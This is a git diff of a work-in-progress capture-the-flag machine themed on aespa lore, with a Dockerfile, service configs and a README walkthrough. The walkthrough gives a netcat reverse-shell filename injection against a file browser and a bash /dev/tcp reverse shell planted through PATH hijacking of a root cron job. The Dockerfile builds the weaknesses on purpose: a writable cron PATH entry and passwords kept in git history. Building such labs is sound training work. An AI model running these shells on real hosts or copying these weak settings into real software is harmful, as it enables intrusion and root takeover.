@@ -1,315 +1,239 @@
-
+./README.md
 ---
-./docker-compose.yml
----
-services:
-  who-ae-u:
-    build: .
-    container_name: who-ae-u
+# Build & run 
+```
+docker compose build --no-cache && docker compose up -d
+```
 
-    ports:
-      - "93:80"
-      - "28:21"
-      - "8080:8080"    # darkhttpd (safe static web)
+go to localhost:97 to find post-auth code injection vulnerability
+- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.
 
----
-./dockerfile
----
-FROM ubuntu:26.04
+port:87: vulneravel a code injection pelo rename
+- precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME
 
-ENV DEBIAN_FRONTEND=noninteractive
 
-RUN apt-get update && apt-get install -y --no-install-recommends \
-    bash \
-    cron \
-    ca-certificates \
-    curl \
-    tar \
-    vsftpd \
-    sudo \
-    git \
-    && rm -rf /var/lib/apt/lists/*
+# Resolvendo CTF
 
-# Remove the default "ubuntu" user (if it exists) and create the only root user: armageddon
-RUN if id ubuntu >/dev/null 2>&1; then userdel -r ubuntu; fi && \
-    useradd -ou 0 -g 0 -m -d /armageddon -s /bin/bash armageddon && \
-    echo "armageddon:l'essence_is_killing_everyone_and_their_copies" | chpasswd && \
-    echo "root:l'essence_is_killing_everyone_and_their_copies" | chpasswd
+## steganography nas midias
+insere string base 64
+echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.mp4 
+echo "You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality." >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
+echo "RG8geW91IHJlbWVtYmVyIGhvdyBpdCB3YXMsIHdoZW4gYWxsIG9mIHRoaXMgbWVzcyBiZWdhbj8gVGhhdCdzIC9zY2VuZTEgb2YgdGhpcyBzdG9yeSAgIA==" >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
 
-# Create CTF users
-RUN useradd -m supernova && \
-    echo "supernova:sususu_mixed_the_aes_and_the_aespa" | chpasswd && \
-    useradd -m aespa && \
-    echo "aespa:cooper" | chpasswd && \
-    useradd -m welcomeToMyWorld && \
-    echo "welcomeToMyWorld:and_thank_you_naevis_we_love_you_WTMW" | chpasswd
+Hi aespa. I don't know if you're the real, the fake, the AI aespa or whatever, I'll let you live if you can make through this challenge. 
+You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality.
+Do you remember how it was, when all of this mess began? That's /scene1 of this story   
 
-# Sudo rules: NOPASSWD for cat inside home, password required for outside
-RUN echo 'supernova ALL=(root) NOPASSWD: /bin/cat /home/supernova/*' > /etc/sudoers.d/supernova && \
-    echo 'supernova ALL=(root) PASSWD: /bin/cat /etc/*, /bin/cat /var/log/*, /bin/cat /tmp/*, /bin/cat /usr/bin/*' >> /etc/sudoers.d/supernova
+to delete 
+sed -i '$d' "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
 
-# Create directories and set ownership
-RUN mkdir -p \
-    /home/supernova/file-browser \
-    /home/supernova/singularity \
-    /home/aespa/ftp \
-    /armageddon && \
-    chown -R supernova:supernova /home/supernova && \
-    chown armageddon:root /armageddon
 
-# Cool "whip" effect (singularity command)
-COPY wda4.sh /usr/bin/singularity
-RUN chmod 755 /usr/bin/singularity
+scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool
+scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
+ftp: user aespa password cooper
+    todo: binwalk coloca link/dica do filebrowser ('see port 97' )
 
-# Bash prompt: singularity runs randomly before each prompt
-RUN cat <<'EOF' >> /etc/bash.bashrc
-# --- SIMULATION GLITCH ---
-export PROMPT_COMMAND='if (( RANDOM % 100 < 30 )); then singularity 2>/dev/null; fi'
-# --- END SIMULATION GLITCH ---
-EOF
+## foothold: CVE-2026-35585  no file-browser
+- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
 
-# Cron job: runs singularity every minute, PATH hijackable by supernova
-RUN cat <<'EOF' > /etc/cron.d/wda4
-PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+## PE
+after login as supernova 
+
+explore until sudo password is found in .git old file history
+```
+```
+
+explore until cronjob is found 
+```
+$ sudo  cat  /etc/cron.d/wda4
+PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:
 * * * * * root singularity >> /var/log/singularity.log 2>&1
-EOF
-# Restrict cron file to root only (owner read/write, no group/other access)
-RUN chmod 600 /etc/cron.d/wda4
+```
 
-# Pre-create the log file with restricted permissions
-RUN touch /var/log/singularity.log && \
-    chmod 600 /var/log/singularity.log && \
-    chown root:root /var/log/singularity.log
+then execute path hijack
+```
+cd singularity
+echo '#!/bin/bash' > singularity
+echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
+chmod +x singularity
+export PATH=/home/supernova/singularity:$PATH
+echo $PATH
+```
 
-# ── Everything below runs as supernova ──────────────────
-USER supernova
+which echo
+# Should output: /tmp/echo
+```
+## Credenciais
+- file browser na localhost:97
+```
+    filebrowser users add armageddon armageddonarmageddon \
+        --database "$DB" \
+        --perm.admin
+        
+    filebrowser users add complexity complexitytrailer \
+    ```
 
-# Install filebrowser
-RUN mkdir -p /home/supernova/bin && \
-    curl -L https://github.com/filebrowser/filebrowser/releases/download/v2.63.1/linux-amd64-filebrowser.tar.gz \
-         -o /tmp/fb.tar.gz && \
-    tar -xzf /tmp/fb.tar.gz -C /home/supernova/bin && \
-    chmod +x /home/supernova/bin/filebrowser && \
-    rm -f /tmp/fb.tar.gz
-
-RUN echo 'export PATH=/home/supernova/bin:$PATH' >> /home/supernova/.bashrc
-
-# Git lore with secrets hidden in deleted files and commit messages
-RUN cd /home/supernova && \
-    git config --global user.email "supernova@kwangya" && \
-    git config --global user.name "supernova" && \
-    git init && \
-    echo "# The ae are born from digital footprints" > README.md && \
-    echo "# They share the same face but are learning to be themselves" >> README.md && \
-    echo "" >> README.md && \
-    echo "Lexistence precede lessence." >> README.md && \
-    git add README.md && \
-    git commit -m "existence precedes essence" && \
-    echo "The first villain was never the AI entity breaking the connection between people and their aes. It was always ourselves." > journal.txt && \
-    echo "Before these REAL WORLD glitches, Ningning kept asking if we saw something weird. She's got eye damage from childhood, but I think her sight is special. She saw the whole sky turn red the day we found naevis." >> journal.txt && \
-    echo "She dealt the killing blow to the entity separating our connection with the ae. With an overwhelming amount of corrupted data. How else are we to defeat an AI that foresees all our attacks?" >> journal.txt && \
-    echo "But the entity was connected with the SYNK, and that 'poisoned' the web between universes. Now, our aes have copied our looks, and are living their own lives." >> journal.txt && \
-    echo "It's a mess. All these glitches are happening because aespa and aes from different worlds are colliding, after naevis sacrificed herself and stopped guarding the Portal Of Souls." >> journal.txt && \
-    echo "" >> journal.txt && \
-    echo "Haven't seen her in forever. Wish her all the best. We know she ressucitated, but does she also have clones? Even our aes are being copied around." >> journal.txt && \
-    echo "password: sususu_mixed_the_aes_and_the_aespa" >> journal.txt && \
-    git add journal.txt && \
-    git commit -m "When we meet again, there is a password we set. That's another story to explain. It's about the aespa that mixed with the aes and turned into these demigod superbeings, like, some kinda supernova." && \
-    git rm journal.txt && \
-    git commit -m "The supernova were a group of aespa and aes that accepted each other. Even the ugly parts. Some others were killed off, fake ones." && \
-    rm -f journal.txt && \
-    echo "It was never about villains stopping us. It was always about l'essence, the path of a person defining themselves. We have fake parts. We have ugly parts. Beautiful, public, honest, we all have different sides. It was always about realizing we lived in a fake reality that spawned from ourselves, killing off some fake parts, accepting sides of us we didn't know to recognize -- the reflection that moves different from you in the mirror." > status.txt && \
-    echo "" >> status.txt && \
-    echo "Do not look back. Only forward." >> status.txt && \
-    git add status.txt && \
-    git commit -m "It was always about defining ourselves." && \
-    git checkout -b kwangya && \
-    echo "NAEVIS is calling. The real world exists beyond FLAT." > kwangya_signal.txt && \
-    echo "" >> kwangya_signal.txt && \
-    echo "To merge with your true self, you must accept what was deleted." >> kwangya_signal.txt && \
-    echo "The password lies in the memory you chose to forget." >> kwangya_signal.txt && \
-    git add kwangya_signal.txt && \
-    git commit -m "signal from the other side" && \
-    git checkout master
-
-# Extra lore: deleted clue about the armageddon daemon
-RUN echo "The armageddon represents the conflict between the aes and the aespa of multiple worlds. The singularity that intersects lives that should parallel." > /home/supernova/wda.txt && \
-    echo "There were all kinds of people there. Superbeing Winter could fly, Karina was a vampire, and Giselle was a freaking time traveller. She fixed some mess while Ningning burned the place. " >> /home/supernova/wda.txt && \
-    echo "Giselle still does something every minute. It basically means they killed a bunch of fake ideas they lived by, accepted unrecognizable parts of themselves, and grew into themselves. When they defined their essence, they became truly godlike. They dominated everything, but not necessarily by killing. Just subjugating their old selves for how they lived. She keeps doing her own kinda singularity every freaking minute, so that others can reach higher. " >> /home/supernova/wda.txt && \
-    echo "There are 4 aespa that are really scary though. They're Whole Different Animals, they're kinda one apocalyptical creature that keeps policing around. Sometimes I see the WDA Winter watching. " >> /home/supernova/wda.txt && \
-    cd /home/supernova && git add wda.txt && git commit -m "Winter's eyes" && \
-    git rm wda.txt && git commit -m "remove trace" && rm -f wda.txt
+# TODO
+- arrumar o character encoding no apache (acento ~ ` etc)
+ftp: binwalk na imagem leva a um login 
+- Colocar um video em index ou alterar a imagem (insira a string base64 notada neste readme), para colocar intrucoes explicando o CTF :
+- - Sit back and relax. The story will be told to you. 
+- - Entenda esta narrativa linearmente.
+- - adicionar dicas  pra motivar as outras regras
+- - deixar o 'light ... run...'
+- - - adicionar em /run uma imagem com dica facil (comando strings) pra porta do FTP 'see port <FTP_PORT>'
+~~bruteforce no login  (user winter password flowers )~~ (ja tem bruteforce no hash da senha em scene1, pra acessar ftp)
 
 
-    # ---------- WEB ------
-# ---------- Switch back to root for package installation ----------
-USER root
+- add steghide ningning  SHA 256
+    I won't make you search every picture here, because if you can search one of them, you can search all of them.
+    If you found this message, what can truly help you is this: walk through door number 48? .
+    easy rockyou 
 
-RUN curl -L https://github.com/emikulic/darkhttpd/releases/download/v1.15/darkhttpd -o /usr/local/bin/darkhttpd && chmod +x /usr/local/bin/darkhttpd
-# Create web directory and copy files
-RUN mkdir -p /var/www/static \
-    && chown -R welcomeToMyWorld:welcomeToMyWorld /var/www/static
+- add binwalk to winter (flowers video, fowers has steghide w password flowers )
+    password to steghid in ftp OP fucking steganography 
+    inside the portal pic, there is a big file, inside it there's some 
+        flie is big so it's easily noticeable 
+        big file strings just gives you the credentials to file browser 
+        if file browser RCE then we're FUCKED
+        do this: FTP in common port ? nah
 
-COPY app/web/ /var/www/static/
-COPY app/media/ /var/www/static/
-RUN chown -R welcomeToMyWorld:welcomeToMyWorld /var/www/static
-# ---------------------------
+- winter
+- - binwalk flowers video named ae-ningning_kermit_dance.mp4 (video can be found from this name, big hint, easy)
+- - flowers video has steghide password flowers (rockyou)
+no need for thorough binwalk, this is an easy version. for FTP 
 
-COPY file-browser/ /home/supernova/file-browser/
-COPY entry.sh /entry.sh
-COPY vsftpd.conf /etc/vsftpd/vsftpd.conf
+- karina pic:
+ -  - this is a tutorial for your near future 
 
-RUN chown -R supernova:supernova /home/supernova && \
-    chown -R aespa:aespa /home/aespa && \
-    chmod +x /entry.sh
+if they find FTP they find filebrowser: 
+put fb info inside images in FTP 
+🔍 Why it works against tools: steghide, stegseek scan pixel data; they never look past EOI. binwalk might flag trailing data as “raw”, but without the key and the knowledge to extract it properly, it’s just random noise.
 
-# Remove tar to harden the container
-USER root
-# RUN apt-get purge -y tar && apt-get autoremove -y
+    ⚠️ Be aware: the appended data can be stripped by re‑encoding the image. But for a CTF where the image is served as‑is, this is excellent.
 
-EXPOSE 80 21 8080
+how would they even find that if they dont know 
 
-CMD ["/entry.sh"]
+bash
 
----
-./entry.sh
----
-#!/bin/sh
-set -e
+# create a payload file
+echo "secret info" > payload.txt
+# encrypt with a strong key (e.g., AES-256)
+openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
+# append the encrypted blob to a JPEG
+cat cover.jpg payload.enc > hidden.jpg
 
-DB=/home/supernova/filebrowser.db
-FILEBROWSER=/home/supernova/bin/filebrowser
+Extract
+bash
 
-# init filebrowser
-if [ ! -f "$DB" ]; then
-    su -s /bin/sh supernova -c "
-        $FILEBROWSER config init \
-            --database $DB \
-            --root /home/supernova/file-browser
-    "
-fi
+# find the offset of the raw encrypted data (after FFD9)
+dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
+# or use binwalk / hex editor; then decrypt
+openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"
 
-# start cron properly (Docker-safe)
-cron
-
-# services
-vsftpd /etc/vsftpd/vsftpd.conf &
-
-su -s /bin/sh supernova -c "
-    $FILEBROWSER \
-        --address 0.0.0.0 \
-        --port 80 \
-        --root /home/supernova/file-browser \
-        --database $DB
-" &
-
-# Start darkhttpd on port 8080, no directory listing, run as welcomeToMyWorld
-/usr/local/bin/darkhttpd /var/www/static --port 8080 --no-listing --uid welcomeToMyWorld --gid welcomeToMyWorld &
-
-# IMPORTANT: keep container alive
-tail -f /dev/null
-
----
-./vsftpd.conf
----
-listen=YES
-
-anonymous_enable=NO
-
-local_enable=YES
-
-write_enable=NO
-
-local_umask=022
-
-use_localtime=YES
-
-xferlog_enable=YES
-
-connect_from_port_20=YES
-
-chroot_local_user=YES
-allow_writeable_chroot=YES
-
-seccomp_sandbox=NO
-
-pam_service_name=vsftpd
-
----./Untitled-2
----
-                                                                                                                        
-                                                                                                                        
-                                                                                                                        
-                                                                                                                        
-                                                                                                                        
-                                                  +==oxxOOX%@@@@@@@@@##%@%x                                             
-                                       =~:!!~~!!!!~~+==oxXXXo=oO##X=O@@@$$%OOo=+                                        
-                                    +''' ..'''::~~+oo=++~!+++~~!x#OoOOxO=xoo=++=                                        
-                                   =+...:!:~~~!++==O@@@#o=+!+++oOO=+!+==+~''!~!+                                        
-                                    xxxX#O=+++++=++=X@@Xx+~~++=+~!!!~!~+!'...'':~                                       
-                                   =+~!!:!~+OX#%%%%%#OOxx=++!''.......         .'!=                                     
-                                  =+~~+~~~~~+==+====++~~!!:'''....               ':~                                    
-                                o=+~~+==oxOOxxoo====+++~~!!:''''...... .          .'~                                   
-                               =++~~+=oo@@%@@$O====++++~!!!!:::''.....            .':+                                  
-                               =+~~++=o@...    @@=+==++~~~!!!!:''''... ..         .'!+                                  
-                               =+~~!~+@...       X@===++~~~!!::''''... .        ..':!+                                  
-                               =++!:::O            %$++~!!!:::''''.....  ...''...'':!+                                  
-                               o+~~!!!+'             o#!!::''''''''''''''''''''..'':!~                                  
-                               o=+~!!!!++              ~O:::::'''''''''''''''''..''::~                                  
-                                =+~~!!!~#X    ~+!        ~x:::'::':''++ =''''''...'::~                                  
-                                =+~!!!!~o  .    Xo+x%x     !o:'''!=.  .+'':'''''.''::~                                  
-                                =++!!!!!+=  ~    :@=~~~X'     =o.    +!'':''''''.''::~                                  
-                                o+~~!!!!!~o      #@@#=O~==          =''::'':':'''':::!                                  
-                                o=+~!!!!~~+o        X##~    '      =:':''::'''''.'':!~                                  
-                                 =+~!!!!!~~#:    '!    ~OXx.!     '+'::'::::::'''''::!                                  
-                                 =+~!!!~!!~#        :   ':.'x'    =::::::::::':''''':!                                  
-                                 =+~~!!!!~~#          ~        '. o:::::::::::'''''::!                                  
-                                 o+~~!!!!!~~o                       'o:::::::::''''::!+                                 
-                                  =+~~!!~~~~X  . .   :          !  .o:::::::::::'':::!                                  
-                                  =+~!~~!+##oO!  !    !X !X'      !x=:::::::::::'''::!=                                 
-                                  =+~!!!!O    ~  X!   ~.#X~!=x     o:::::::::::''''::!+                                 
-                                  o++~~!~:        '#         .     x::!:::::::::':'':!+                                 
-                                  o++~~oO      ++:    !          =ox:!:::::::::::::::!+                                 
-                                   =o+o.      ~  .~                'O!:::::::::::''::!+                                 
-                                   =o''xOXx.   +                    :=xxxooo+:::::'::!+                                 
-                                   o+x'..    .!oX!..      .'!!          =xxx::::'::::!~                                 
-                                   o+~x:'.                          :Ox.    o:::::::::~                                 
-                                   =++!x'. ~                     OO!       o::::::::!:~                                 
-                                    =++!~=.    ~'           'XXo          x::::::::::!~                                 
-                                    =+~~~~X           :~XXX~             x:::::::::::!~                                 
-                                    =++!~~~X                            x!!!:::::::::!~                                 
-                                    o+~~~~~~+X                 =XOO  x O:::::::::::::!~                                 
-                                    o=~~~~~!~~+#:  .     !  Oo~X!   OxO:!!:!::::!::::!!                                 
-                                    +=++~~~~~++           X#X      =+!!!!:!!::!::::::!!                                 
-                                     =+~~~~~~~#       '~.          O!!!!!:!:::::!!:!!!~+                                
-                                     =+~~~~~~~~+!   !'              X!!!!!!!:::::~~!!~!                                 
-                                     =++~~~~~~~# !          !    +O!+~:!!!:!!:::~:~=!:!+                                
-                                     o++~~~~~~~# #X      '.       O! =o!!!!!o+!=o!=::!!=                                
-                                      =+~~~~~~~#X~~oO.!      .'   !   o~=~!+~~!=+!:::!!+                                
-                              https://media1.tenor.com/m/JF7UtjidQqYAAAAd/winter-aespa.gif        =++~~~~~~~~O#       :      .  x xOo=+:+=+!~:'!::!+                                
-                                      =+~~~~~~~#~    .:         :    x+o~===!!:::::':!~                                 
-                                      o++~~~~O+  :'             :!   !+.'O!!!:::''!'::                                  
-                                       =+~~~o'.                X~!+Xx      O+:!!!:.!~                                   
-                                         +~~o.               xx!~!!!!!!!!!!!!!!:!:+                                     
-                                           +~o!            Xx~~~!!!!!!!!!!!!!:!+                                        
-                                               ==X#o~+xX#o~~~~~!~!!!~!!!!!=                                             
-                                                       +===+++++==oo                                                    
-                                                                                                                        
-                                                                                                                        
-                                                                                                                        
+- portal pic 
+- flowers vid inside 
 
 
-                                                                                                                        .▄▄ · ▪   ▐ ▄  ▄▄ • ▄• ▄▌▄▄▌   ▄▄▄· ▄▄▄ .▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌
-▐█ ▀. ██ •█▌▐█▐█ ▀ ▪█▪██▌██•  ▐█ ▀█ ▀▄.▀·▀▄ █·██ •██  ▐█▪██▌
-▄▀▀▀█▄▐█·▐█▐▐▌▄█ ▀█▄█▌▐█▌██▪  ▄█▀▀█ ▐▀▀▪▄▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪
-▐█▄▪▐█▐█▌██▐█▌▐█▄▪▐█▐█▄█▌▐█▌▐▌▐█ ▪▐▌▐█▄▄▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.
- ▀▀▀▀ ▀▀▀▀▀ █▪·▀▀▀▀  ▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • 
 
- ▐▄ ·▄ ▄▄▄▄▄  ▪  ▄▄▄. ▄▄▄ ·▄▄▄   ▐▄▄▐▄ •▄ • ▄▄  ▄ ▌   ▪ · ▄▄.
-▐██▪█▌  ██• ██·█ ▄▀·▀.▄▀ █▀ █▌  •██▐██▪█▪ ▀ █▌█▌▐█• ██ .▀ █▌
-▪█▌▐█▌▪.█▌ ·█▌ ▄▀▀▌▄▪▀▀▌ █▀▀█▄  ▪██▐█▌▐█▄█▀ █▄▐▌▌█▌·█▌▄█▀▀▀▄
-.·▀█▌ ·▐█▌ ▐█▌▐█•█▌▐▄▄█▌▐▌▪ █▌▐▌▐█▌▐█▄█▌█▌▪▄█▌▐█▌██▐█▌█▌▪▄█▌
- • ▀   ▀▀▀ ▀▀▀▀  ▀. ▀▀▀  ▀  ▀  ▀▀▀. ▀▀▀  ▀▀▀▀·▪█ ▀▀▀▀▀ ▀▀▀▀ 
+
+bash
+
+# create a payload file
+echo "secret info" > payload.txt
+# encrypt with a strong key (e.g., AES-256)
+openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
+# append the encrypted blob to a JPEG
+cat cover.jpg payload.enc > hidden.jpg
+
+Extract
+bash
+
+# find the offset of the raw encrypted data (after FFD9)
+dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
+# or use binwalk / hex editor; then decrypt
+openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"
+
+
+
+
+- hide file-browser link in FTP 
+
+
+# Problemas
+cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 
+
+
+nota: flower e cooper estao na rockyou.txt
+
+
+# Misc NOtes
+
+there is a process running as root, a script 
+the script calls a command by name 
+user will try to 
+
+its in folder or process /armageddon
+script is synk 
+synk echoes something like ' You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality ' 
+
+would be cool if synk was a crontab -- is that on theme with cron or not? 
+
+supernova non root user can create a file to path hijack, but supernova whole filesys is locked by sudo write (is it possible to lock this do they may ONLY write if they got SUDO password?)
+
+supernova doesnt actually get to run anything as root despite having a sudo -- is this possible? if not, give them sudo only for the specific commands for file write & read
+
+
+for consider that the story of this ctf follows aespa's story 
+
+ctf starts as giselle in scene 1
+
+the ae are born, lexistence precedes lessence
+
+a strange phenomenon is happening
+
+the ae copied aespa looks and are living their own lives releasing music 
+
+the ae and the aespa are all copied 
+
+winter realizes that theyve been living in a fake world and to reach reality they must destroy parts and embrace hidden parts (can be a reference to git) of  themselves (steal root)
+
+
+this is the official lore 
+Armageddon’s lore is about aespa bringing destruction upon themselves in order to destroy the artificial world they exist in. WDA are the 4 horses of the apocalypse bringing destruction
+
+WINTER merging with the giant eye and growing wings symbolizes awakening, while the collapsing AI city represents destruction of that fake controlled reality
+
+The hip hop versions of aespa represent theirselves trapped in the system while the bizarre superhuman versions are their future evolved selves
+
+aespa lore explained by Karina
+
+Karina: The aespa in reality and the fake aespa keeps getting mixed together, the reason is that in reality, us, the Armageddon aespa, Dirty Work aespa, Whiplash aespa etc the aespas that should be in different worlds have banded together in one place. For example, there are four more of me here, so it gets confusing right? So a rupture forms in this world
+
+
+
+
+
+
+| Technical Concept    | Story Meaning                 |
+| -------------------- | ----------------------------- |
+| Current files        | Present identity              |
+| History              | Forgotten memories            |
+| Deleted content      | Repressed self                |
+| Branches             | Alternate selves              |
+| Merge                | Accepting multiple identities |
+| Root                 | New, merged, real reality. original root is one thing, but achieving PE root is like merging hidden parts and compromising the previous fake               |
+| Privilege escalation | Reaching the truth            |
+| Enumeration          | Self-discovery                |
+| Hidden files         | Suppressed memories           |
+
+
+change user names in machine image: 
+- aespa: the one serving website
+- WTMW: file browser
+- supernova: ftp
+- armageddon: root 
 
 ---
 ./docker-compose.yml
@@ -328,7 +252,7 @@ services:
 ./dockerfile
 ---
 FROM ubuntu:26.04
-
+# TODO WHAT USER takes care of ftp what if theyre compromised, 
 ENV DEBIAN_FRONTEND=noninteractive
 
 # Added apache2 to package installation list
@@ -456,7 +380,9 @@ RUN echo "The armageddon represents the conflict between the aes and the aespa o
 
 
 # ---------- WEB (APACHE2 SECURE HARDENING) ------
-# Switch back to root for web service configuration
+# Switch back to root for web service 
+
+# ---------- WEB (APACHE2 SECURE HARDENING) ------
 USER root
 
 # Create web directory and copy files
@@ -465,18 +391,34 @@ COPY app/web/ /var/www/static/
 COPY app/media/ /var/www/static/
 RUN chown -R welcomeToMyWorld:welcomeToMyWorld /var/www/static
 
-# Reconfigure Apache to run entirely on Port 8080 serving /var/www/static
+# Reconfigure Apache to run on port 8080, serve /var/www/static
 RUN sed -i 's/Listen 80/Listen 8080/' /etc/apache2/ports.conf && \
     sed -i 's/<VirtualHost \*:80>/<VirtualHost \*:8080>/' /etc/apache2/sites-available/000-default.conf && \
     sed -i 's|DocumentRoot /var/www/html|DocumentRoot /var/www/static|' /etc/apache2/sites-available/000-default.conf
 
-# Drop Apache runtime identity securely to welcomeToMyWorld
+# Drop Apache runtime identity to welcomeToMyWorld
 RUN sed -i 's/export APACHE_RUN_USER=www-data/export APACHE_RUN_USER=welcomeToMyWorld/' /etc/apache2/envvars && \
     sed -i 's/export APACHE_RUN_GROUP=www-data/export APACHE_RUN_GROUP=welcomeToMyWorld/' /etc/apache2/envvars && \
+    mkdir -p /var/log/apache2 /var/lock/apache2 /var/run/apache2 && \
     chown -R welcomeToMyWorld:welcomeToMyWorld /var/log/apache2 /var/lock/apache2 /var/run/apache2
 
-# Inject your custom Directory strict-indexing constraints rules directly into the configuration
-RUN echo "\n<Directory /var/www/static>\n    Options -Indexes\n    AllowOverride None\n    Require all granted\n</Directory>" >> /etc/apache2/apache2.conf
+# Enable headers module (optional, for the X-Hint header)
+RUN a2enmod headers
+
+# Append custom configuration (safe, no broken \n)
+RUN cat <<'EOF' >> /etc/apache2/apache2.conf
+
+AddType video/mp4 .mp4
+Header always set X-Hint "/scene1"
+
+<Directory /var/www/static>
+    Options -Indexes
+    AllowOverride None
+    Require all granted
+</Directory>
+EOF
+
+
 # ---------------------------
 
 COPY file-browser/ /home/supernova/file-browser/
@@ -531,6 +473,487 @@ apache2 -D FOREGROUND &
 tail -f /dev/null
 
 ---
+./o.txt
+---
+./README.md
+---
+# Build & run 
+```
+docker compose build --no-cache && docker compose up -d
+```
+
+go to localhost:97 to find post-auth code injection vulnerability
+- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.
+
+port:87: vulneravel a code injection pelo rename
+- precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME
+
+
+# Resolvendo CTF
+
+## steganography nas midias
+insere string base 64
+echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.mp4 
+echo "You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality." >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
+echo "RG8geW91IHJlbWVtYmVyIGhvdyBpdCB3YXMsIHdoZW4gYWxsIG9mIHRoaXMgbWVzcyBiZWdhbj8gVGhhdCdzIC9zY2VuZTEgb2YgdGhpcyBzdG9yeSAgIA==" >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
+
+Hi aespa. I don't know if you're the real, the fake, the AI aespa or whatever, I'll let you live if you can make through this challenge. 
+You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality.
+Do you remember how it was, when all of this mess began? That's /scene1 of this story   
+
+to delete 
+sed -i '$d' "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
+
+
+scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool
+scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
+ftp: user aespa password cooper
+    todo: binwalk coloca link/dica do filebrowser ('see port 97' )
+
+## foothold: CVE-2026-35585  no file-browser
+- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
+
+
+## PE
+after login as supernova 
+
+explore until sudo password is found in .git old file history
+```
+```
+
+explore until cronjob is found 
+```
+$ sudo  cat  /etc/cron.d/wda4
+PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:
+* * * * * root singularity >> /var/log/singularity.log 2>&1
+```
+
+then execute path hijack
+```
+cd singularity
+echo '#!/bin/bash' > singularity
+echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
+chmod +x singularity
+export PATH=/home/supernova/singularity:$PATH
+echo $PATH
+```
+
+which echo
+# Should output: /tmp/echo
+```
+## Credenciais
+- file browser na localhost:97
+```
+    filebrowser users add armageddon armageddonarmageddon \
+        --database "$DB" \
+        --perm.admin
+        
+    filebrowser users add complexity complexitytrailer \
+    ```
+
+# TODO
+- arrumar o character encoding no apache (acento ~ ` etc)
+ftp: binwalk na imagem leva a um login 
+- Colocar um video em index ou alterar a imagem (insira a string base64 notada neste readme), para colocar intrucoes explicando o CTF :
+- - Sit back and relax. The story will be told to you. 
+- - Entenda esta narrativa linearmente.
+- - adicionar dicas  pra motivar as outras regras
+- - deixar o 'light ... run...'
+- - - adicionar em /run uma imagem com dica facil (comando strings) pra porta do FTP 'see port <FTP_PORT>'
+~~bruteforce no login  (user winter password flowers )~~ (ja tem bruteforce no hash da senha em scene1, pra acessar ftp)
+
+
+- add steghide ningning  SHA 256
+    I won't make you search every picture here, because if you can search one of them, you can search all of them.
+    If you found this message, what can truly help you is this: walk through door number 48? .
+    easy rockyou 
+
+- add binwalk to winter (flowers video, fowers has steghide w password flowers )
+    password to steghid in ftp OP fucking steganography 
+    inside the portal pic, there is a big file, inside it there's some 
+        flie is big so it's easily noticeable 
+        big file strings just gives you the credentials to file browser 
+        if file browser RCE then we're FUCKED
+        do this: FTP in common port ? nah
+
+- winter
